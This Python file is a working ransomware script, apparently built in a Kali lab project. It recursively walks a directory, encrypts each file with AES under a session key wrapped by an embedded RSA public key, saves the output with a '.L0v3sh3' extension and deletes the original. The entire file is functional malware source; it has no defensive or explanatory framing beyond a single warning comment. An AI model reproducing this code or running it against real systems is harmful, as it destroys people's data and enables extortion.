import base64
import os
from pathlib import Path
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES



def scanRecurse(baseDir):
    '''
    Scan a directory and return a list of all files
    return: list of files
    '''
    for entry in os.scandir(baseDir):
        if entry.is_file():
            yield entry
        else:
            yield from scanRecurse(entry.path)


def encrypt(dataFile, publicKey):
    '''
    Input: path to file to encrypt, public key
    Output: encrypted file with extension .L0v3sh3 and remove original file
    use EAX mode to allow detection of unauthorized modifications
    '''
    # read data from file
    extension = dataFile.suffix.lower()
    dataFile = str(dataFile)
    with open(dataFile, 'rb') as f:
        data = f.read()

    
    # convert data to bytes
    data = bytes(data)
    
    # create public key object
    key = RSA.import_key(publicKey)
    sessionKey = os.urandom(16)

    # encrypt the session key with the public key
    cipher = PKCS1_OAEP.new(key)
    encryptedSessionKey = cipher.encrypt(sessionKey)

    # encrypt the data with the session key
    cipher = AES.new(sessionKey, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data)

    # save the encrypted data to file
    fileName= dataFile.split(extension)[0]
    fileExtension = '.L0v3sh3'
    encryptedFile = fileName + fileExtension
    with open(encryptedFile, 'wb') as f:
        [ f.write(x) for x in (encryptedSessionKey, cipher.nonce, tag, ciphertext) ]
    os.remove(dataFile)

pubKey=b'LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUF4VG0xZG1wcXpQQVFqVklBU1BjUQoyS0NaZmJXNEdtWit1RmhzZmg5eG56ZTV3M2dVVHYzMFREeFZwcUZpbWZZb2lLQnN0TC9UYjl2RmM2YjNyRU5HCks3dzMzYkdLcCtRWnJ5OVpBOW1nRm44dklFcFZ2RnEwTEtSM24rbXllSUVrWlBRVDIrdENJWmQxTDNsMDBCdTEKUkhaSkJLU212QXFYYmlyYnZ2V3YxdlNMeEthRDdwemZObU9pcmowMFd4OUdmay9SMk5Sck52MVlsY0hjSXJaMAo0WC9RaXpSdDZwejR3SUxHZ2g0Rk44akNLUzZva2gxa1NyS3RJUTlKd215eDFKS2tsa2FROTZqQUJmenFUT2hQCk1iclhnd25kYkhuUmtCcVZJSUZrbmZuRUtsRDVGbSttc0x0SEpSVVJTK2VRdTM2QzZJUGx2QnJxS1ZPN0pHR1UKeHdJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t'
pubKey=base64.b64decode(pubKey)

# change directory to the directory of the script
# keep secure of changing the directory,
# DONT RUN THIS SCRIPT ON YOUR PC
directory = r'/home/kali/Desktop/Projects/ransomware/V1 - Asymétrique' # CHANGE THIS
excludeExtension = ['.py','.pem', '.exe'] # CHANGE THIS
for item in scanRecurse(directory): 
    filePath = Path(item)
    fileType = filePath.suffix.lower()

    if fileType in excludeExtension:
        continue
    encrypt(filePath, pubKey)